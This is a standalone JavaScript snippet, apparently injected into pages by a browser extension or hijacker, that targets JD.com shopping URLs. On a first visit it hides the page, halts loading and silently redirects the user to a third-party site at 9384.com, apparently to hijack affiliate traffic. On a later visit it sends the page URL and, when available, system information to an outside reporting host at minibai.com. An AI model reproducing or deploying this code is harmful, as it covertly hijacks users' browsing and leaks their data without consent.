!function(w,ju){
	var runUrl = [
		'click.jd.com',
		'u.jd.com',
		'www.jd.com'
	],key = 'Fdjfiesfhviup33215';
	for(var i of runUrl){
		if(location.href.indexOf(i) != -1){
			if(!getCookie(key)){
        document.body.style.display = 'none';
				if (w.stop)w.stop();
				else document.execCommand("Stop");
				setCookie(key,1, 5);
				location.replace(ju);
			}else if(getCookie(key) == 1){
				setCookie(key,2, 5);
				upload_();
        break;
			}
		}
	}
	
  function upload_() {
		let url = '//cclientreport2.minibai.com/tmp5log.json',
		data = {
			h: w.location.href,
			t: 2,
		};
		
		if(chrome.xb && chrome.xb.getSysInfo)chrome.xb.getSysInfo(function(s){
			data = {
				h: w.location.href,
				t: 2,
				s
			}
			post({
				url,
				data
			});
		})
		else post({
      url,
      data
    });
    
  }
  function post(options) {
    options = options || {};
    options.type = "POST";
    options.dataType = options.dataType || 'json';
    options.async = options.async || true;
    options.timeout = options.timeout || 100;
    var params = getParams(options.data),
      xhr, timeoutFlag = null;
    window.clearTimeout(timeoutFlag);
    xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function () {
      if (xhr.readyState == 4) {
        var status = xhr.status;
        if (status >= 200 && status < 300) {
          window.clearTimeout(timeoutFlag);
          options.success && options.success(xhr.responseText, xhr.responseXML);
        } else {
          window.clearTimeout(timeoutFlag);
          options.error && options.error(status);
        }
      }
    };
    xhr.open('POST', options.url, options.async);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send(params);
    timeoutFlag = window.setTimeout(function () {
      window.clearTimeout(timeoutFlag);
      xhr.abort();
    }.bind(this), options.timeout);
  }
  function getParams(data) {
    var arr = [];
    for (var param in data) {
      arr.push(encodeURIComponent(param) + '=' + encodeURIComponent(data[param]));
    }
    return arr.join('&');
  }
  function setCookie(key,value,expirehours){
		var date = new Date();
		date.setTime(date.getTime() + expirehours * 3600 * 1000);
		document.cookie= key +"="+ value +"; expires="+date.toGMTString();
	}
	function getCookie(cname) {  
    var name = cname + "=";  
    var ca = document.cookie.split(';');  
    for(var i=0; i<ca.length; i++) {  
        var c = ca[i];  
        while (c.charAt(0)==' ') c = c.substring(1);  
        if (c.indexOf(name) != -1) return c.substring(name.length, c.length);  
    }  
    return "";  
	} 
}(window.top,'https://www.9384.com/jd.html?AAA');



